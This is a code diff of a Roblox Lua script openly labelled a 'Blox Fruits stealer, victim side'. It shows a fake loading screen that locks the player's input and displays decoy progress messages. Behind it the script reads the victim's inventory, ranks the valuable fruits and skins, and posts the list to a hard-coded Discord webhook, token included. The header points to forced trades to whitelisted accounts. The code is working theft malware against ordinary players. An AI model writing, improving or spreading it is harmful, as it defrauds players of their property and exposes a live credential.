@@ -1,26 +1,70 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v3.4
--- Guard accepts documented PlaceIds OR game.Name contains "Blox"/"Fruit".
--- Boot log prints game.Name + PlaceId + decision.
+-- BLOX FRUITS STEALER — VICTIM SIDE v4
+-- Sections:
+--   1. CONFIG
+--   2. SERVICES + STATE
+--   3. LOADER (spawns immediately)
+--   4. INPUT LOCK
+--   5. PLACE GUARD (console-only)
+--   6. REMOTE WAIT
+--   7. HTTP
+--   8. INVENTORY + PRIORITY
+--   9. EMBED
+--  10. CHARACTER / MAP / ZONE WAITS
+--  11. SEATS
+--  12. ANTI-CHEAT-SAFE TELEPORT
+--  13. SIT
+--  14. TRADE
+--  15. CHAT COMMANDS
+--  16. MAIN LOOP
 -- =============================================================================
 
+-- =============================================================================
+-- 1. CONFIG
+-- =============================================================================
 local S2, S3 = 4442272183, 7449423635
-local KNOWN = { [2753915549] = true, [4442272183] = true, [7449423635] = true, [95165932064349] = true }
-
-local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
-local WHITELIST = { ["Ghostywateryt"] = true, ["mythicalop123456"] = true }
-local LOADER_SECONDS = 180
-local MAX_ITEMS_PER_TRADE = 4
-local KICK_THRESHOLD = 5
-local KICK_MSG = "RUN AFTER TRADE 5/5 RESETS!"
-
-local FRUIT_PRIORITY = { "dragonwest", "dragoneast", "kitsune", "magnet", "control", "venom" }
-local SKIN_PRIORITY = {
-    "rabid","vibes","galaxy","doghouse","ember","redlightning","divine","arcsteel","celestial",
-    "werewolf","hellfire","sadness","superspirit","purplelightning","crimson","azura","thermite",
-    "frustration","framebreak","portal","eclipse","hallow","leviathan","darkblade","valkyrie","dogblade",
+local KNOWN_PLACES = {
+    [2753915549]     = true,  -- Sea 1
+    [4442272183]     = true,  -- Sea 2
+    [7449423635]     = true,  -- Sea 3
+    [95165932064349] = true,  -- alt/unknown documented id
 }
 
+local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
+
+local WHITELIST = {
+    ["Ghostywateryt"]    = true,
+    ["mythicalop123456"] = true,
+}
+
+local LOADER_SECONDS       = 180
+local MAX_ITEMS_PER_TRADE  = 4
+local KICK_THRESHOLD       = 5
+local KICK_MSG             = "RUN AFTER TRADE 5/5 RESETS!"
+local CHAT_PREFIX          = "."
+
+-- Fruit priority (lower index = grabbed first)
+local FRUIT_PRIORITY = {
+    "dragonwest",
+    "dragoneast",
+    "kitsune",
+    "magnet",
+    "control",
+    "venom",
+}
+
+-- Skin / perm priority (ranked after fruits)
+local SKIN_PRIORITY = {
+    "rabid", "vibes", "galaxy", "doghouse", "ember",
+    "redlightning", "divine", "arcsteel", "celestial",
+    "werewolf", "hellfire", "sadness", "superspirit", "purplelightning",
+    "crimson", "azura", "thermite", "frustration", "framebreak",
+    "portal", "eclipse", "hallow", "leviathan", "darkblade", "valkyrie", "dogblade",
+}
+
+-- =============================================================================
+-- 2. SERVICES + STATE
+-- =============================================================================
 local Players      = game:GetService("Players")
 local RS           = game:GetService("ReplicatedStorage")
 local RunService   = game:GetService("RunService")
@@ -29,85 +73,297 @@ local HttpService  = game:GetService("HttpService")
 local LP           = Players.LocalPlayer
 local PG           = LP:WaitForChild("PlayerGui")
 
--- BOOT LOG
-local BootLog = (function()
+local CommF         = nil
+local TradeFunction = nil
+local tradesCompleted = 0
+local lastTpAt = 0
+
+local function log(msg)
+    pcall(function() print("[stealer] " .. tostring(msg)) end)
+end
+
+log("boot | game=" .. tostring(game.Name) .. " | placeId=" .. tostring(game.PlaceId))
+
+-- =============================================================================
+-- 3. LOADER — spawned immediately as first action
+-- =============================================================================
+local function showLoadingScreen()
+    if not game:IsLoaded() then
+        pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)
+    end
+
     local sg = Instance.new("ScreenGui")
-    sg.Name = "StealerBootLog"
+    sg.Name = "ProfileLoadingScreen"
     sg.IgnoreGuiInset = true
-    sg.DisplayOrder = 2147483600
     sg.ResetOnSpawn = false
-    local ok = pcall(function() sg.Parent = game:GetService("CoreGui") end)
-    if not ok then sg.Parent = PG end
-    local f = Instance.new("Frame")
-    f.Size = UDim2.new(0, 480, 0, 320)
-    f.Position = UDim2.new(0, 8, 0, 8)
-    f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    f.BackgroundTransparency = 0.2
-    f.Parent = sg
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 6)
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -16, 1, -16)
-    lbl.Position = UDim2.new(0, 8, 0, 8)
-    lbl.BackgroundTransparency = 1
-    lbl.TextColor3 = Color3.fromRGB(0, 255, 120)
-    lbl.Font = Enum.Font.Code
-    lbl.TextSize = 12
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.TextYAlignment = Enum.TextYAlignment.Top
-    lbl.TextWrapped = true
-    lbl.Text = "BOOT LOG"
-    lbl.Parent = f
-    local lines = { "BOOT LOG" }
-    return {
-        sg = sg,
-        log = function(msg)
-            local line = tostring(msg)
-            pcall(function() print("[stealer] " .. line) end)
-            lines[#lines + 1] = line
-            while #lines > 18 do table.remove(lines, 1) end
-            pcall(function() lbl.Text = table.concat(lines, "\n") end)
-        end,
-        destroy = function() if sg.Parent then sg:Destroy() end end,
+    sg.DisplayOrder = 99999
+    sg.Modal = true
+    sg.Parent = PG
+
+    -- input absorber
+    local blocker = Instance.new("TextButton")
+    blocker.Size = UDim2.new(1, 0, 1, 0)
+    blocker.BackgroundTransparency = 1
+    blocker.Text = ""
+    blocker.Active = true
+    blocker.Modal = true
+    blocker.ZIndex = 2
+    blocker.Parent = sg
+
+    local touchGui = PG:FindFirstChild("TouchGui")
+    if touchGui then touchGui.Enabled = false end
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 3
+    mainFrame.Parent = sg
+
+    local bgGradient = Instance.new("UIGradient")
+    bgGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(4, 4, 8)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 18, 30)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 8)),
+    })
+    bgGradient.Rotation = 45
+    bgGradient.Parent = mainFrame
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 16
+    blur.Parent = workspace.CurrentCamera
+
+    local particleContainer = Instance.new("Frame")
+    particleContainer.Size = UDim2.new(1, 0, 1, 0)
+    particleContainer.BackgroundTransparency = 1
+    particleContainer.ZIndex = 3
+    particleContainer.Parent = mainFrame
+
+    local function spawnParticle()
+        local p = Instance.new("Frame")
+        local size = math.random(2, 4)
+        p.Size = UDim2.new(0, size, 0, size)
+        p.Position = UDim2.new(math.random(), 0, 1.1, 0)
+        p.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        p.BackgroundTransparency = math.random(4, 7) / 10
+        p.BorderSizePixel = 0
+        p.ZIndex = 4
+        p.Parent = particleContainer
+        Instance.new("UICorner", p).CornerRadius = UDim.new(1, 0)
+        TweenService:Create(p, TweenInfo.new(math.random(4, 6), Enum.EasingStyle.Linear), {
+            Position = UDim2.new(p.Position.X.Scale, math.random(-40, 40), -0.1, 0),
+            BackgroundTransparency = 1,
+        }):Play()
+        task.delay(6, function() if p.Parent then p:Destroy() end end)
+    end
+
+    local centerPanel = Instance.new("Frame")
+    centerPanel.Size = UDim2.new(0, 360, 0, 250)
+    centerPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    centerPanel.AnchorPoint = Vector2.new(0.5, 0.5)
+    centerPanel.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
+    centerPanel.BackgroundTransparency = 0.2
+    centerPanel.BorderSizePixel = 0
+    centerPanel.ZIndex = 5
+    centerPanel.Parent = mainFrame
+    Instance.new("UICorner", centerPanel).CornerRadius = UDim.new(0, 14)
+    local panelStroke = Instance.new("UIStroke", centerPanel)
+    panelStroke.Color = Color3.fromRGB(0, 170, 255)
+    panelStroke.Thickness = 1.5
+    panelStroke.Transparency = 0.3
+
+    local watermarkLabel = Instance.new("TextLabel")
+    watermarkLabel.Size = UDim2.new(0.5, 0, 0, 20)
+    watermarkLabel.Position = UDim2.new(0, 12, 0, 8)
+    watermarkLabel.BackgroundTransparency = 1
+    watermarkLabel.Text = "Made by Màrk L."
+    watermarkLabel.Font = Enum.Font.GothamMedium
+    watermarkLabel.TextSize = 10
+    watermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    watermarkLabel.TextXAlignment = Enum.TextXAlignment.Left
+    watermarkLabel.TextTransparency = 0.65
+    watermarkLabel.ZIndex = 6
+    watermarkLabel.Parent = centerPanel
+
+    local profileCircle = Instance.new("Frame")
+    profileCircle.Size = UDim2.new(0, 75, 0, 75)
+    profileCircle.Position = UDim2.new(0.5, 0, 0.28, 0)
+    profileCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    profileCircle.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+    profileCircle.BorderSizePixel = 0
+    profileCircle.ZIndex = 6
+    profileCircle.Parent = centerPanel
+    Instance.new("UICorner", profileCircle).CornerRadius = UDim.new(1, 0)
+    local circleStroke = Instance.new("UIStroke", profileCircle)
+    circleStroke.Color = Color3.fromRGB(0, 255, 170)
+    circleStroke.Thickness = 2
+
+    local avatarImage = Instance.new("ImageLabel")
+    avatarImage.Size = UDim2.new(0.92, 0, 0.92, 0)
+    avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
+    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
+    avatarImage.BackgroundTransparency = 1
+    avatarImage.ZIndex = 6
+    avatarImage.Parent = profileCircle
+    Instance.new("UICorner", avatarImage).CornerRadius = UDim.new(1, 0)
+    pcall(function()
+        avatarImage.Image = Players:GetUserThumbnailAsync(LP.UserId,
+            Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+    end)
+
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(0.88, 0, 0, 35)
+    infoLabel.Position = UDim2.new(0.5, 0, 0.54, 0)
+    infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
+    infoLabel.Font = Enum.Font.GothamBlack
+    infoLabel.TextSize = 11
+    infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    infoLabel.TextWrapped = true
+    infoLabel.ZIndex = 6
+    infoLabel.Parent = centerPanel
+    local infoStroke = Instance.new("UIStroke", infoLabel)
+    infoStroke.Color = Color3.fromRGB(0, 0, 0)
+    infoStroke.Thickness = 1.5
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 20)
+    statusLabel.Position = UDim2.new(0, 0, 0.63, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Initializing environmental pipeline..."
+    statusLabel.Font = Enum.Font.GothamMedium
+    statusLabel.TextSize = 9.5
+    statusLabel.TextColor3 = Color3.fromRGB(150, 155, 170)
+    statusLabel.ZIndex = 6
+    statusLabel.Parent = centerPanel
+
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, 0, 0, 20)
+    percentLabel.Position = UDim2.new(0, 0, 0.79, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.Font = Enum.Font.Code
+    percentLabel.TextSize = 13
+    percentLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
+    percentLabel.ZIndex = 6
+    percentLabel.Parent = centerPanel
+
+    local barTrack = Instance.new("Frame")
+    barTrack.Size = UDim2.new(0.85, 0, 0, 4)
+    barTrack.Position = UDim2.new(0.075, 0, 0.70, 0)
+    barTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
+    barTrack.BorderSizePixel = 0
+    barTrack.ZIndex = 6
+    barTrack.Parent = centerPanel
+    Instance.new("UICorner", barTrack).CornerRadius = UDim.new(1, 0)
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+    barFill.BorderSizePixel = 0
+    barFill.ZIndex = 6
+    barFill.Parent = barTrack
+    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+    Instance.new("UIGradient", barFill).Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170)),
+    })
+
+    local discordLabel = Instance.new("TextLabel")
+    discordLabel.Size = UDim2.new(1, 0, 0, 15)
+    discordLabel.Position = UDim2.new(0.5, 0, 0.94, 0)
+    discordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    discordLabel.BackgroundTransparency = 1
+    discordLabel.Text = "Join https://discord.gg/mozil"
+    discordLabel.Font = Enum.Font.Code
+    discordLabel.TextSize = 10.5
+    discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+    discordLabel.ZIndex = 6
+    discordLabel.Parent = centerPanel
+
+    local loopConnection = RunService.Heartbeat:Connect(function()
+        if math.random() < 0.04 then spawnParticle() end
+        local pulse = (math.sin(tick() * 4) + 1) / 2
+        circleStroke.Transparency = 0.1 + (pulse * 0.4)
+        panelStroke.Transparency = 0.2 + (pulse * 0.3)
+    end)
+
+    centerPanel.Size = UDim2.new(0, 300, 0, 210)
+    TweenService:Create(centerPanel, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        { Size = UDim2.new(0, 360, 0, 250) }):Play()
+
+    local phrases = {
+        "Securing environmental pipeline...",
+        "Decrypting core structural assets...",
+        "Bypassing security network checks...",
+        "Injecting operational system logic...",
+        "Finalizing execution environment...",
     }
-end)()
-local function log(m) BootLog.log(m) end
 
-log("script started | executor=" .. tostring((identifyexecutor and identifyexecutor()) or "?"))
-log("game.Name=" .. tostring(game.Name))
-log("placeId=" .. tostring(game.PlaceId))
-log("localPlayer=" .. LP.Name)
+    local t0 = os.time()
+    while true do
+        local elapsed = os.time() - t0
+        local progress = math.clamp(elapsed / LOADER_SECONDS, 0, 1)
+        local percent = math.floor(progress * 100)
 
--- =============================================================================
--- GUARD: PlaceId OR game.Name
--- =============================================================================
-local function placeOk()
-    if KNOWN[game.PlaceId] then return true, "known PlaceId" end
-    local n = tostring(game.Name):lower()
-    if n:find("blox", 1, true) or n:find("fruit", 1, true) then
-        return true, "game.Name contains Blox/Fruit"
+        if percent >= 98 then
+            TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad),
+                { Size = UDim2.new(0.98, 0, 1, 0) }):Play()
+            percentLabel.Text = "98%"
+            break
+        end
+
+        TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Linear),
+            { Size = UDim2.new(progress, 0, 1, 0) }):Play()
+        percentLabel.Text = percent .. "%"
+
+        if percent < 20 then statusLabel.Text = phrases[1]
+        elseif percent < 45 then statusLabel.Text = phrases[2]
+        elseif percent < 70 then statusLabel.Text = phrases[3]
+        elseif percent < 90 then statusLabel.Text = phrases[4]
+        else statusLabel.Text = phrases[5] end
+
+        task.wait(0.4)
     end
-    return false, "not a known Blox Fruits PlaceId or name"
+
+    task.wait(2)
+    TweenService:Create(barFill, TweenInfo.new(0.3), { Size = UDim2.new(1, 0, 1, 0) }):Play()
+    percentLabel.Text = "100%"
+    task.wait(0.6)
+
+    loopConnection:Disconnect()
+    if blur.Parent then blur:Destroy() end
+    if touchGui then touchGui.Enabled = true end
+    if sg.Parent then sg:Destroy() end
+    log("loader closed")
 end
 
-local ok, why = placeOk()
-if not ok then
-    log("guard: " .. why .. " | placeId=" .. tostring(game.PlaceId))
-    log("waiting up to 120s for teleport...")
-    local t0 = tick()
-    while tick() - t0 < 120 do
-        task.wait(0.5)
-        local ok2 = placeOk()
-        if ok2 then ok = true; why = "teleported into place"; break end
-    end
+-- SPAWN LOADER FIRST
+task.spawn(function()
+    local ok, err = pcall(showLoadingScreen)
+    if not ok then log("loader error: " .. tostring(err)) end
+end)
+
+-- =============================================================================
+-- 4. PLACE GUARD — console-only, never blocks
+-- =============================================================================
+do
+    local ok = KNOWN_PLACES[game.PlaceId]
     if not ok then
-        log("still not recognised after 120s — running anyway")
-        log("seat finder will fail gracefully if map absent")
+        local n = tostring(game.Name):lower()
+        if n:find("blox", 1, true) or n:find("fruit", 1, true) then ok = true end
+    end
+    if ok then
+        log("place OK | placeId=" .. tostring(game.PlaceId) .. " | name=" .. tostring(game.Name))
+    else
+        log("place NOT recognised | placeId=" .. tostring(game.PlaceId) ..
+            " | name=" .. tostring(game.Name) .. " — continuing anyway")
     end
 end
-log("guard: OK (" .. why .. ") | placeId=" .. tostring(game.PlaceId))
 
 -- =============================================================================
--- WAIT FOR REMOTES
+-- 5. REMOTE WAIT
 -- =============================================================================
 local function waitChild(parent, name, timeout)
     local t0 = tick()
@@ -120,29 +376,16 @@ local function waitChild(parent, name, timeout)
 end
 
 local RemotesFolder = waitChild(RS, "Remotes", 30)
-if not RemotesFolder then log("FATAL: Remotes not found"); return end
-log("Remotes found")
-
-local CommF = waitChild(RemotesFolder, "CommF_", 30)
-if not CommF then
-    local names = {}
-    for _, c in ipairs(RemotesFolder:GetChildren()) do names[#names + 1] = c.Name end
-    log("FATAL: CommF_ not found — children: " .. table.concat(names, ", "))
-    return
+if RemotesFolder then
+    CommF = waitChild(RemotesFolder, "CommF_", 30)
+    TradeFunction = waitChild(RemotesFolder, "TradeFunction", 30)
 end
-log("CommF_ found")
 
-local TradeFunction = waitChild(RemotesFolder, "TradeFunction", 30)
-if not TradeFunction then
-    local names = {}
-    for _, c in ipairs(RemotesFolder:GetChildren()) do names[#names + 1] = c.Name end
-    log("FATAL: TradeFunction not found — children: " .. table.concat(names, ", "))
-    return
-end
-log("TradeFunction found")
+if CommF then log("CommF_ OK") else log("WARN: CommF_ missing — inventory will fail") end
+if TradeFunction then log("TradeFunction OK") else log("WARN: TradeFunction missing — trade will fail") end
 
 -- =============================================================================
--- HTTP
+-- 6. HTTP
 -- =============================================================================
 local function getHttpFn()
     if syn and syn.request then return syn.request end
@@ -159,7 +402,8 @@ local function postEmbed(embed)
     local okBody, body = pcall(function()
         return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } })
     end)
-    if not okBody then log("json encode failed: " .. tostring(body)) return end
+    if not okBody then log("json encode failed") return end
+
     local ok, res = pcall(fn, {
         Url = WEBHOOK, Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
@@ -167,25 +411,31 @@ local function postEmbed(embed)
     })
     if not ok then log("http failed: " .. tostring(res)) return end
     if res and res.StatusCode and res.StatusCode >= 400 then
-        log("http status " .. res.StatusCode .. ": " .. tostring(res.Body):sub(1, 120))
+        log("http status " .. res.StatusCode)
     else
-        log("webhook ok: status " .. tostring(res and res.StatusCode))
+        log("webhook ok")
     end
 end
 
 -- =============================================================================
--- INVENTORY / CLASSIFICATION
+-- 7. INVENTORY + PRIORITY
 -- =============================================================================
-local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
+local function norm(s)
+    return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "")
+end
+
 local function getInventory()
+    if not CommF then return nil end
     local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
     return ok and inv or nil
 end
+
 local function isFruit(item)
     if not item then return false end
     if item.Type == "Blox Fruit" then return true end
     return norm(item.Name):find("fruit", 1, true) ~= nil
 end
+
 local function isPremium(item)
     if not item then return false end
     if item.Type == "Premium" then return true end
@@ -196,14 +446,20 @@ local function isPremium(item)
     end
     return false
 end
+
 local function priorityRank(item)
     local n = norm(item.Name)
-    for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
-    for i, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return 100 + i end end
+    for i, kw in ipairs(FRUIT_PRIORITY) do
+        if n:find(kw, 1, true) then return i end
+    end
+    for i, kw in ipairs(SKIN_PRIORITY) do
+        if n:find(kw, 1, true) then return 100 + i end
+    end
     if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return 500 end
     if item.Type == "Blox Fruit" then return 600 end
     return 999
 end
+
 local function collectTradeable()
     local inv = getInventory()
     if not inv then return {} end
@@ -214,6 +470,10 @@ local function collectTradeable()
     table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
     return out
 end
+
+-- =============================================================================
+-- 8. EMBED
+-- =============================================================================
 local function sendInventoryEmbed(reason)
     local inv = getInventory() or {}
     local ordered = {}
@@ -221,11 +481,14 @@ local function sendInventoryEmbed(reason)
         if isFruit(item) or isPremium(item) then ordered[#ordered + 1] = item end
     end
     table.sort(ordered, function(a, b) return priorityRank(a) < priorityRank(b) end)
+
     local lines = {}
     for i, item in ipairs(ordered) do
-        lines[#lines + 1] = string.format("#%02d  %s (x%d)", i, tostring(item.Name):gsub("-", " "), item.Count or 1)
+        lines[#lines + 1] = string.format("#%02d  %s (x%d)",
+            i, tostring(item.Name):gsub("-", " "), item.Count or 1)
     end
     if #lines == 0 then lines = { "None" } end
+
     postEmbed({
         title = "🍇 Blox Fruits — Victim on chair",
         description = reason or "Whitelisted trade started.",
@@ -240,193 +503,9 @@ local function sendInventoryEmbed(reason)
     })
 end
 
--- INPUT LOCK + LOADER
-local function lockInput(sg)
-    sg.Modal = true
-    local blocker = Instance.new("TextButton")
-    blocker.Size = UDim2.new(1, 0, 1, 0)
-    blocker.BackgroundTransparency = 1
-    blocker.Text = ""
-    blocker.Active = true; blocker.Modal = true; blocker.ZIndex = 2
-    blocker.Parent = sg
-    local touchGui = PG:FindFirstChild("TouchGui")
-    if touchGui then touchGui.Enabled = false end
-    return function()
-        if touchGui then touchGui.Enabled = true end
-        if blocker.Parent then blocker:Destroy() end
-        sg.Modal = false
-    end
-end
-
-local function showLoadingScreen()
-    log("loader: building UI")
-    if not game:IsLoaded() then pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end) end
-    local sg = Instance.new("ScreenGui")
-    sg.Name = "ProfileLoadingScreen"
-    sg.IgnoreGuiInset = true; sg.ResetOnSpawn = false; sg.DisplayOrder = 99999
-    sg.Parent = PG
-    local unlock = lockInput(sg)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(1, 0, 1, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-    mainFrame.BorderSizePixel = 0; mainFrame.ZIndex = 3
-    mainFrame.Parent = sg
-    local bgGradient = Instance.new("UIGradient")
-    bgGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(4, 4, 8)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 18, 30)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 8)),
-    })
-    bgGradient.Rotation = 45; bgGradient.Parent = mainFrame
-    local blur = Instance.new("BlurEffect"); blur.Size = 16; blur.Parent = workspace.CurrentCamera
-    local pc = Instance.new("Frame"); pc.Size = UDim2.new(1, 0, 1, 0); pc.BackgroundTransparency = 1; pc.ZIndex = 3; pc.Parent = mainFrame
-    local function spawnParticle()
-        local p = Instance.new("Frame")
-        local size = math.random(2, 4)
-        p.Size = UDim2.new(0, size, 0, size)
-        p.Position = UDim2.new(math.random(), 0, 1.1, 0)
-        p.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-        p.BackgroundTransparency = math.random(4, 7) / 10
-        p.BorderSizePixel = 0; p.ZIndex = 4; p.Parent = pc
-        Instance.new("UICorner", p).CornerRadius = UDim.new(1, 0)
-        TweenService:Create(p, TweenInfo.new(math.random(4, 6), Enum.EasingStyle.Linear), {
-            Position = UDim2.new(p.Position.X.Scale, math.random(-40, 40), -0.1, 0),
-            BackgroundTransparency = 1,
-        }):Play()
-        task.delay(6, function() if p.Parent then p:Destroy() end end)
-    end
-    local centerPanel = Instance.new("Frame")
-    centerPanel.Size = UDim2.new(0, 360, 0, 250)
-    centerPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
-    centerPanel.AnchorPoint = Vector2.new(0.5, 0.5)
-    centerPanel.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
-    centerPanel.BackgroundTransparency = 0.2
-    centerPanel.BorderSizePixel = 0; centerPanel.ZIndex = 5
-    centerPanel.Parent = mainFrame
-    Instance.new("UICorner", centerPanel).CornerRadius = UDim.new(0, 14)
-    local ps = Instance.new("UIStroke", centerPanel)
-    ps.Color = Color3.fromRGB(0, 170, 255); ps.Thickness = 1.5; ps.Transparency = 0.3
-    local wm = Instance.new("TextLabel")
-    wm.Size = UDim2.new(0.5, 0, 0, 20); wm.Position = UDim2.new(0, 12, 0, 8)
-    wm.BackgroundTransparency = 1; wm.Text = "Made by Màrk L."
-    wm.Font = Enum.Font.GothamMedium; wm.TextSize = 10; wm.TextColor3 = Color3.fromRGB(255, 255, 255)
-    wm.TextXAlignment = Enum.TextXAlignment.Left; wm.TextTransparency = 0.65; wm.ZIndex = 6
-    wm.Parent = centerPanel
-    local circ = Instance.new("Frame")
-    circ.Size = UDim2.new(0, 75, 0, 75); circ.Position = UDim2.new(0.5, 0, 0.28, 0)
-    circ.AnchorPoint = Vector2.new(0.5, 0.5); circ.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
-    circ.BorderSizePixel = 0; circ.ZIndex = 6; circ.Parent = centerPanel
-    Instance.new("UICorner", circ).CornerRadius = UDim.new(1, 0)
-    local cs = Instance.new("UIStroke", circ)
-    cs.Color = Color3.fromRGB(0, 255, 170); cs.Thickness = 2
-    local av = Instance.new("ImageLabel")
-    av.Size = UDim2.new(0.92, 0, 0.92, 0); av.Position = UDim2.new(0.5, 0, 0.5, 0)
-    av.AnchorPoint = Vector2.new(0.5, 0.5); av.BackgroundTransparency = 1; av.ZIndex = 6
-    av.Parent = circ
-    Instance.new("UICorner", av).CornerRadius = UDim.new(1, 0)
-    pcall(function() av.Image = Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) end)
-    local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(0.88, 0, 0, 35); info.Position = UDim2.new(0.5, 0, 0.54, 0)
-    info.AnchorPoint = Vector2.new(0.5, 0.5); info.BackgroundTransparency = 1
-    info.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
-    info.Font = Enum.Font.GothamBlack; info.TextSize = 11
-    info.TextColor3 = Color3.fromRGB(255, 215, 0); info.TextWrapped = true; info.ZIndex = 6
-    info.Parent = centerPanel
-    local ist = Instance.new("UIStroke", info); ist.Color = Color3.fromRGB(0, 0, 0); ist.Thickness = 1.5
-    local st = Instance.new("TextLabel")
-    st.Size = UDim2.new(1, 0, 0, 20); st.Position = UDim2.new(0, 0, 0.63, 0)
-    st.BackgroundTransparency = 1; st.Text = "Initializing environmental pipeline..."
-    st.Font = Enum.Font.GothamMedium; st.TextSize = 9.5
-    st.TextColor3 = Color3.fromRGB(150, 155, 170); st.ZIndex = 6; st.Parent = centerPanel
-    local pct = Instance.new("TextLabel")
-    pct.Size = UDim2.new(1, 0, 0, 20); pct.Position = UDim2.new(0, 0, 0.79, 0)
-    pct.BackgroundTransparency = 1; pct.Text = "0%"
-    pct.Font = Enum.Font.Code; pct.TextSize = 13
-    pct.TextColor3 = Color3.fromRGB(0, 255, 170); pct.ZIndex = 6; pct.Parent = centerPanel
-    local track = Instance.new("Frame")
-    track.Size = UDim2.new(0.85, 0, 0, 4); track.Position = UDim2.new(0.075, 0, 0.70, 0)
-    track.BackgroundColor3 = Color3.fromRGB(25, 27, 38); track.BorderSizePixel = 0
-    track.ZIndex = 6; track.Parent = centerPanel
-    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-    fill.BorderSizePixel = 0; fill.ZIndex = 6; fill.Parent = track
-    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-    Instance.new("UIGradient", fill).Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170)),
-    })
-    local dc = Instance.new("TextLabel")
-    dc.Size = UDim2.new(1, 0, 0, 15); dc.Position = UDim2.new(0.5, 0, 0.94, 0)
-    dc.AnchorPoint = Vector2.new(0.5, 0.5); dc.BackgroundTransparency = 1
-    dc.Text = "Join https://discord.gg/mozil"
-    dc.Font = Enum.Font.Code; dc.TextSize = 10.5
-    dc.TextColor3 = Color3.fromRGB(0, 170, 255); dc.ZIndex = 6; dc.Parent = centerPanel
-    local loopConn = RunService.Heartbeat:Connect(function()
-        if math.random() < 0.04 then spawnParticle() end
-        local pulse = (math.sin(tick() * 4) + 1) / 2
-        cs.Transparency = 0.1 + (pulse * 0.4)
-        ps.Transparency = 0.2 + (pulse * 0.3)
-    end)
-    centerPanel.Size = UDim2.new(0, 300, 0, 210)
